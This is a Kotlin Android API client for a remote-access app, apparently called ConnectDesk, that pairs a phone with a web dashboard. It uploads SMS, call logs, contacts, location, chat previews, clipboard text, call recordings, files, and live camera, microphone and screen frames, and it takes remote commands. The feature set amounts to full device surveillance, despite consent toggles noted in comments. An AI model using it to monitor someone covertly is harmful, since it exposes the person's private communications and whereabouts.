package com.connectdesk.app

import android.content.Context
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * Minimal API client for the ConnectDesk backend.
 *
 * Endpoints (see docs/API.md):
 *   POST {base}/api/device/claim         {code, deviceName} -> {deviceId?, deviceToken?, error?}
 *   POST {base}/api/device/status        {deviceToken}      -> {status, capabilities}
 *   POST {base}/api/device/heartbeat     {deviceToken, ...} -> {status}
 *   POST {base}/api/device/notifications {deviceToken, ...} -> {status}
 *
 * Set BASE_URL to your deployed dashboard origin (no trailing slash).
 */
object ApiClient {
    // ConnectDesk backend (Convex HTTP actions serve at .convex.site).
    // Resolved automatically by Backend so a dev -> production deployment
    // switch never breaks an already-installed app.
    val BASE_URL: String
        get() = Backend.active ?: Backend.candidates.first()

    /**
     * Probes a candidate deployment.
     *
     * The previous version returned true for ANY HTTP answer, which is far too
     * weak: a Convex deployment with no `http.ts` pushed still answers, just
     * with plain text. Picking such a deployment looks alive but can never
     * complete a pairing, and the user only sees "Invalid pairing code".
     *
     * So the probe now asserts on OUR OWN response shape. `/api/device/status`
     * with an unknown token answers `{"error":"Unknown device token"}`, which
     * can only come from a deployment that actually has these routes.
     */
    private fun probe(url: String): Boolean = try {
        val request = Request.Builder()
            .url("$url/api/device/status")
            .post(JSONObject().put("deviceToken", "probe").toString().toRequestBody(json))
            .build()
        client.newCall(request).execute().use { resp ->
            val raw = resp.body?.string().orEmpty()
            try {
                val obj = JSONObject(raw)
                obj.has("error") || obj.has("deviceId")
            } catch (_: Exception) {
                false
            }
        }
    } catch (_: Exception) {
        false
    }

    /** Finds a reachable backend and makes it active. Safe to call often. */
    fun ensureBackend(context: android.content.Context) {
        Backend.resolve(context, ::probe)
    }

    /**
     * Human-readable reason for the most recent failed request. The pairing
     * screen shows this so the user knows whether it was a network problem,
     * an expired/used code, or a backend mismatch — instead of one vague
     * "pairing failed" message.
     */
    @Volatile
    var lastError: String? = null

    /**
     * True when the last [post] failed because we never got an HTTP answer
     * (no internet, DNS, timeout, TLS), as opposed to the server answering
     * with a non-2xx status.
     *
     * This distinction is the whole reason the app no longer logs itself out
     * by accident: "could not ask the server" and "the server says this token
     * is not valid" are completely different events and must never be
     * collapsed into the same `null`.
     */
    @Volatile
    var lastErrorWasNetwork: Boolean = false

    private val json = "application/json; charset=utf-8".toMediaType()
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    /**
     * Application context captured once at startup. Only used to persist the
     * resolved backend URL — never to hold an Activity.
     */
    @Volatile
    private var appContext: Context? = null

    fun attach(context: Context) {
        appContext = context.applicationContext
        Backend.init(appContext!!)
    }

    private fun post(path: String, body: JSONObject): JSONObject? {
        lastErrorWasNetwork = false
        val request = Request.Builder()
            .url("$BASE_URL$path")
            .post(body.toString().toRequestBody(json))
            .build()
        // Debug builds log every request and response so a tester can see
        // exactly what left the device. Gated on a BuildConfig constant that
        // is false in every release build.
        if (BuildConfig.TEST_MODE) {
            android.util.Log.d(
                "ConnectDeskNet",
                "POST $path ${body.toString().take(400)}",
            )
        }
        return try {
            client.newCall(request).execute().use { resp ->
                val raw = resp.body?.string().orEmpty()
                if (BuildConfig.TEST_MODE) {
                    android.util.Log.d(
                        "ConnectDeskNet",
                        "RESP $path HTTP ${resp.code} ${raw.take(400)}",
                    )
                }
                if (!resp.isSuccessful) {
                    // Surface the backend's own reason (e.g. "Invalid pairing
                    // code", "Pairing code expired") plus the HTTP status.
                    val serverMsg = try {
                        JSONObject(raw).optString("error").ifEmpty { JSONObject(raw).optString("message") }
                    } catch (_: Exception) {
                        ""
                    }
                    lastError = if (serverMsg.isNotEmpty()) {
                        "$serverMsg (HTTP ${resp.code})"
                    } else {
                        "Server returned HTTP ${resp.code}"
                    }
                    return null
                }
                lastError = null
                if (raw.isEmpty()) JSONObject() else JSONObject(raw)
            }
        } catch (_: Exception) {
            // The active deployment may have been rotated. Re-resolve once and
            // retry so a dev -> production switch never strands the device.
            val ctx = appContext
            if (ctx != null) {
                val previous = BASE_URL
                val recovered = Backend.resolve(ctx, ::probe)
                if (recovered != null && recovered != previous) {
                    return post(path, body)
                }
            }
            lastError = "No connection to the ConnectDesk server — check internet"
            lastErrorWasNetwork = true
            null
        }
    }

    fun claim(code: String, deviceName: String): Pair<String, String>? {
        val body = JSONObject()
            .put("code", code.trim().uppercase())
            .put("deviceName", deviceName)
            .put("osVersion", android.os.Build.VERSION.RELEASE)
            .put("appVersion", BuildConfig.VERSION_NAME)

        var resp = post("/api/device/claim", body)

        // A reachable backend that says "Invalid pairing code" for a code the
        // dashboard just generated is the classic signature of a DEPLOYMENT
        // MISMATCH: the code was written on one Convex deployment and we read
        // it from another. Walk EVERY remaining candidate before telling the
        // user their code is wrong -- a single retry was not enough when the
        // stored URL pointed at a deployment the dashboard had since moved off.
        var attempts = 0
        while (resp == null && attempts < Backend.candidates.size) {
            val reason = lastError ?: ""
            if (!reason.contains("Invalid pairing code")) break
            val ctx = appContext
            if (ctx == null || !Backend.rotate(ctx)) break
            resp = post("/api/device/claim", body)
            attempts++
        }

        val result = resp ?: return null
        val token = result.optString("deviceToken")
        if (token.isEmpty()) {
            val why = result.optString("error").ifEmpty { result.optString("message") }
            lastError = if (why.isNotEmpty()) why else "Server did not return a device token"
            return null
        }
        return Pair(result.optString("deviceId"), token)
    }

    data class DeviceState(
        val status: String,
        val name: String,
        val files: Boolean,
        val notifications: Boolean,
        val screenShare: Boolean,
        val clipboard: Boolean,
        val sms: Boolean = false,
        val callLogs: Boolean = false,
        val contacts: Boolean = false,
        val location: Boolean = false,
        val media: Boolean = false,
        val chats: Boolean = false,
        val appActivity: Boolean = false,
    )

    private fun parseState(resp: JSONObject): DeviceState {
        val caps = resp.optJSONObject("capabilities") ?: JSONObject()
        return DeviceState(
            status = resp.optString("status"),
            name = resp.optString("name"),
            files = caps.optBoolean("files", false),
            notifications = caps.optBoolean("notifications", false),
            screenShare = caps.optBoolean("screen_share", false),
            clipboard = caps.optBoolean("clipboard", false),
            sms = caps.optBoolean("sms", false),
            callLogs = caps.optBoolean("call_logs", false),
            contacts = caps.optBoolean("contacts", false),
            location = caps.optBoolean("location", false),
            media = caps.optBoolean("media", false),
            chats = caps.optBoolean("chats", false),
            appActivity = caps.optBoolean("app_activity", false),
        )
    }

    /**
     * Outcome of asking the server about this token.
     *
     * The old code returned a single nullable `DeviceState`, which made a lost
     * connection indistinguishable from a rejected token — and the UI treated
     * both as "logged out". These three cases are kept apart on purpose.
     */
    sealed class StatusResult {
        /** The server answered and this token is valid. */
        data class Known(val state: DeviceState) : StatusResult()

        /**
         * The server answered and does not know this token. Only THIS may
         * ever end a session.
         */
        object Rejected : StatusResult()

        /**
         * No usable answer: offline, timeout, 5xx, or a deployment that is
         * currently paused. The session must be left exactly as it is.
         */
        object Unreachable : StatusResult()
    }

    fun statusResult(token: String): StatusResult {
        val body = JSONObject().put("deviceToken", token)
        val resp = post("/api/device/status", body)
            ?: return if (lastErrorWasNetwork) {
                StatusResult.Unreachable
            } else {
                StatusResult.Rejected
            }
        if (resp.has("error")) return StatusResult.Rejected
        val state = parseState(resp)
        if (state.status.isEmpty()) return StatusResult.Unreachable
        return StatusResult.Known(state)
    }

    /**
     * Asks every candidate deployment whether it recognises this token.
     *
     * A dev -> production deployment switch is indistinguishable from a real
     * logout on the wire: the other deployment simply answers "Unknown device
     * token" for a token that is perfectly valid. Before treating that as the
     * end of the session, all candidates are asked, and if one of them knows
     * the token it becomes the active deployment and the session continues.
     */
    fun relocateForToken(token: String): DeviceState? {
        val ctx = appContext ?: return null
        val original = Backend.active
        for (candidate in Backend.candidates) {
            if (candidate == BASE_URL) continue
            Backend.setActive(ctx, candidate)
            val resp = post("/api/device/status", JSONObject().put("deviceToken", token))
            if (resp != null && !resp.has("error") && resp.optString("status").isNotEmpty()) {
                return parseState(resp) // candidate stays active
            }
        }
        if (original != null) Backend.setActive(ctx, original)
        return null
    }

    /**
     * Convenience wrapper used by the background services, which do not care
     * *why* a status call failed — only whether the server said anything.
     */
    fun status(token: String): DeviceState? =
        (statusResult(token) as? StatusResult.Known)?.state

    fun heartbeat(token: String, batteryPct: Int?, storageUsedMb: Long?, storageTotalMb: Long?): String? {
        val body = JSONObject().put("deviceToken", token)
        batteryPct?.let { body.put("batteryPct", it) }
        storageUsedMb?.let { body.put("storageUsedMb", it) }
        storageTotalMb?.let { body.put("storageTotalMb", it) }
        val resp = post("/api/device/heartbeat", body) ?: return null
        return resp.optString("status")
    }

    fun pushNotification(token: String, appName: String, title: String, bodyText: String): Boolean {
        val body = JSONObject()
            .put("deviceToken", token)
            .put("appName", appName)
            .put("title", title)
            .put("body", bodyText)
        val resp = post("/api/device/notifications", body) ?: return false
        return resp.optString("status") == "stored"
    }

    /** POST /api/device/sync — bulk data (sms/calls/contacts/location/media). */
    fun postSync(payload: JSONObject): Boolean {
        val resp = post("/api/device/sync", payload) ?: return false
        return resp.optString("status") == "stored"
    }

    // ---- Chat previews (dashboard <- device notification listener) ---------

    /**
     * Sends one chat-app message preview.
     *
     * The preview is exactly what Android already rendered on the phone's
     * lock screen. Android sandboxes the messaging apps' own databases, so a
     * real chat history is not readable by any third-party app and this
     * method does not pretend otherwise.
     *
     * Returns the server verdict so the listener can stop early:
     *  "stored"        -> keep going
     *  "capability_off" -> the dashboard owner turned chat sync off
     *  "history_off"     -> the account turned retention off
     */
    fun pushChatMessage(
        token: String,
        app: String,
        appName: String,
        conversation: String,
        body: String,
        isGroup: Boolean,
        direction: String,
        postedAt: Long,
    ): String? {
        val payload = JSONObject()
            .put("deviceToken", token)
            .put("app", app)
            .put("appName", appName)
            .put("conversation", conversation)
            .put("body", body)
            .put("isGroup", isGroup)
            .put("direction", direction)
            .put("postedAt", postedAt)
        val resp = post("/api/device/chats/message", payload) ?: return null
        return resp.optString("status")
    }

    // ---- Call recordings ---------------------------------------------------

    /**
     * Opens a call-recording slot on the server.
     *
     * The audio is the device's own microphone only: Android gives a
     * third-party app no way to capture the other party on a phone call, so
     * the recording is one-sided by platform design and the dashboard says so
     * next to every file.
     */
    fun startCallRecording(
        token: String,
        name: String,
        number: String?,
        startedAt: Long,
    ): RecordingSlot? {
        val body = JSONObject()
            .put("deviceToken", token)
            .put("name", name)
            .put("startedAt", startedAt)
        if (number != null) body.put("number", number)
        val resp = post("/api/device/calls/recording/start", body) ?: return null
        val recordingId = resp.optString("recordingId")
        val mediaId = resp.optString("mediaId")
        if (recordingId.isEmpty() || mediaId.isEmpty()) return null
        return RecordingSlot(
            recordingId = recordingId,
            mediaId = mediaId,
            chunkSize = resp.optInt("chunkSize", 256 * 1024),
        )
    }

    data class RecordingSlot(
        val recordingId: String,
        val mediaId: String,
        val chunkSize: Int,
    )

    /** Closes the slot after every chunk has been uploaded. */
    fun finishCallRecording(
        token: String,
        recordingId: String,
        sizeBytes: Long,
        durationSec: Int,
        mime: String,
    ): Boolean {
        val body = JSONObject()
            .put("deviceToken", token)
            .put("recordingId", recordingId)
            .put("sizeBytes", sizeBytes)
            .put("durationSec", durationSec)
            .put("mime", mime)
        val resp = post("/api/device/calls/recording/finish", body) ?: return false
        return resp.optString("status") == "stored"
    }

// ---- Command queue + media transfer (dashboard -> device) ----

    /**
     * Heartbeat + live hardware detail in one call, so the dashboard's device
     * card is never more than a minute behind.
     */
    fun heartbeatDetailed(
        token: String,
        batteryPct: Int?,
        storageUsedMb: Long?,
        storageTotalMb: Long?,
        detail: JSONObject,
    ): String? {
        val body = JSONObject().put("deviceToken", token)
        batteryPct?.let { body.put("batteryPct", it) }
        storageUsedMb?.let { body.put("storageUsedMb", it) }
        storageTotalMb?.let { body.put("storageTotalMb", it) }
        body.put("wifiSsid", detail.opt("wifiSsid"))
        body.put("networkType", detail.opt("networkType"))
        body.put("bluetoothOn", detail.optBoolean("bluetoothOn"))
        body.put("airplaneMode", detail.optBoolean("airplaneMode"))
        body.put("uptimeMs", detail.optLong("uptimeMs"))
        body.put("memoryUsedMb", detail.optLong("memoryUsedMb"))
        body.put("memoryTotalMb", detail.optLong("memoryTotalMb"))
        val resp = post("/api/device/heartbeat", body) ?: return null
        return resp.optString("status")
    }

    /**
     * Uploads one clipboard entry. Credential-shaped text and anything a
     * password manager flagged is dropped on the phone before we get here.
     */
    fun pushClipboard(
        token: String,
        text: String,
        label: String?,
        isSensitive: Boolean,
        copiedAt: Long,
    ): String? {
        val body = JSONObject()
            .put("deviceToken", token)
            .put("text", text)
            .put("isSensitive", isSensitive)
            .put("copiedAt", copiedAt)
        if (label != null) body.put("label", label)
        val resp = post("/api/device/clipboard", body) ?: return null
        return resp.optString("status")
    }

    data class DeviceCommand(val id: String, val type: String, val payload: JSONObject)

    /** Poll pending dashboard commands (SMS reply, photo fetch). */
    fun popCommands(token: String): List<DeviceCommand> {
        val body = JSONObject().put("deviceToken", token)
        val resp = post("/api/device/commands", body) ?: return emptyList()
        val arr = resp.optJSONArray("commands") ?: return emptyList()
        val out = mutableListOf<DeviceCommand>()
        for (i in 0 until arr.length()) {
            val o = arr.optJSONObject(i) ?: continue
            out.add(
                DeviceCommand(
                    o.optString("id"),
                    o.optString("type"),
                    o.optJSONObject("payload") ?: JSONObject(),
                ),
            )
        }
        return out
    }

    /** Report a command result back to the dashboard. */
    fun completeCommand(token: String, commandId: String, ok: Boolean, result: String): Boolean {
        val body = JSONObject()
            .put("deviceToken", token)
            .put("commandId", commandId)
            .put("ok", ok)
            .put("result", result)
        val resp = post("/api/device/commands/complete", body) ?: return false
        return resp.optString("status") == "ok"
    }

    /** Upload one base64 chunk of a media file (dashboard download). */
    fun uploadMediaChunk(token: String, mediaId: String, index: Int, total: Int, dataB64: String): Boolean {
        val body = JSONObject()
            .put("deviceToken", token)
            .put("mediaId", mediaId)
            .put("index", index)
            .put("total", total)
            .put("dataB64", dataB64)
        val resp = post("/api/device/media/chunk", body) ?: return false
        return resp.optString("status") == "stored"
    }

    // ---- Live screen share (JPEG frame streaming) --------------------------

    // Frames are bigger than the default POSTs; use a longer timeout client.
    private val screenClient = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(25, TimeUnit.SECONDS)
        .build()

    /**
     * Uploads one live screen-share JPEG frame. Returns the server verdict:
     *  "stored"         -> frame accepted, keep streaming
     *  "no_session"      -> session stopped/timed out: STOP capturing
     *  "capability_off"  -> owner turned screen_share off: STOP capturing
     *  null / other      -> transient failure, retry next tick
     */
    fun pushScreenFrame(token: String, seq: Long, width: Int, height: Int, dataB64: String): String? {
        val body = JSONObject()
            .put("deviceToken", token)
            .put("seq", seq)
            .put("width", width)
            .put("height", height)
            .put("dataB64", dataB64)
        val request = Request.Builder()
            .url("$BASE_URL/api/device/screen/frame")
            .post(body.toString().toRequestBody(json))
            .build()
        return try {
            screenClient.newCall(request).execute().use { resp ->
                if (!resp.isSuccessful) return null
                resp.body?.string()?.let { JSONObject(it).optString("status") }
            }
        } catch (e: Exception) {
            null
        }
    }

    // ---- Account login (username + password) ---------------------------

    /**
     * Signs in with the SAME username/password the dashboard uses. Creates the
     * account on first use. Returns (deviceId, deviceToken) on success.
     */
    fun login(username: String, password: String, deviceName: String): Pair<String, String>? {
        val body = JSONObject()
            .put("username", username.trim())
            .put("password", password)
            .put("deviceName", deviceName)
            .put("osVersion", android.os.Build.VERSION.RELEASE)
            .put("appVersion", BuildConfig.VERSION_NAME)
        val resp = post("/api/device/login", body) ?: return null
        val token = resp.optString("deviceToken")
        if (token.isEmpty()) {
            val reason = resp.optString("error")
            lastError = if (reason.isNotEmpty()) reason else "Login failed"
            return null
        }
        return Pair(resp.optString("deviceId"), token)
    }

    // ---- Files ------------------------------------------------------------

    /** Pushes a fresh scan of the device's storage to the dashboard. */
    fun syncFiles(token: String, files: JSONArray): Boolean {
        val body = JSONObject().put("deviceToken", token).put("files", files)
        val resp = post("/api/device/files/sync", body) ?: return false
        return resp.optString("status") == "stored"
    }

    /** Uploads one chunk of a file the dashboard asked for. */
    fun uploadFileChunk(token: String, fileId: String, index: Int, total: Int, dataB64: String): Boolean {
        val body = JSONObject()
            .put("deviceToken", token)
            .put("fileId", fileId)
            .put("index", index)
            .put("total", total)
            .put("dataB64", dataB64)
        val resp = post("/api/device/files/chunk", body) ?: return false
        return resp.optString("status") == "stored"
    }

    // ---- Camera -----------------------------------------------------------

    /** Uploads one camera capture; it becomes a normal downloadable photo. */
    fun uploadCameraPhoto(token: String, facing: String, dataB64: String): Boolean {
        val body = JSONObject()
            .put("deviceToken", token)
            .put("facing", facing)
            .put("dataB64", dataB64)
        val resp = post("/api/device/camera/photo", body) ?: return false
        return resp.optString("status") == "stored"
    }

    /**
     * Uploads one frame of the LIVE camera stream.
     *
     * Unlike `uploadCameraPhoto` this does NOT create a stored media item —
     * frames are transient. The server keeps only the newest frame per
     * device, so streaming a live camera does not fill storage.
     */
    /**
     * POST /api/device/mic/frame — one live microphone clip.
     *
     * The clip is a self-contained WAV the dashboard can play as-is. A
     * `no_session` answer means the phone owner stopped sharing; the caller
     * treats it as a normal (non-fatal) result and the service shuts the
     * microphone down after a few of those in a row.
     */
    fun postMicFrame(
        token: String,
        seq: Int,
        dataB64: String,
        durationMs: Long,
    ): Boolean {
        val body = JSONObject()
            .put("deviceToken", token)
            .put("seq", seq)
            .put("dataB64", dataB64)
            .put("durationMs", durationMs)
        val resp = post("/api/device/mic/frame", body) ?: return false
        val s = resp.optString("status")
        return s == "stored" || s == "no_session"
    }

    fun postCameraFrame(
        token: String,
        dataB64: String,
        width: Int,
        height: Int,
        seq: Int,
    ): Boolean {
        val body = JSONObject()
            .put("deviceToken", token)
            .put("dataB64", dataB64)
            .put("width", width)
            .put("height", height)
            .put("seq", seq)
        val resp = post("/api/device/camera/frame", body) ?: return false
        val s = resp.optString("status")
        return s == "stored" || s == "no_session" || s == "disabled"
    }

    // ---- local token persistence (per-app private storage) ----
    private const val PREFS = "connectdesk"
    private const val KEY_TOKEN = "deviceToken"

    fun saveToken(context: Context, token: String) {
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putString(KEY_TOKEN, token).apply()
    }

    fun loadToken(context: Context): String? =
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString(KEY_TOKEN, null)

    fun clearToken(context: Context) {
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().remove(KEY_TOKEN).apply()
    }
}
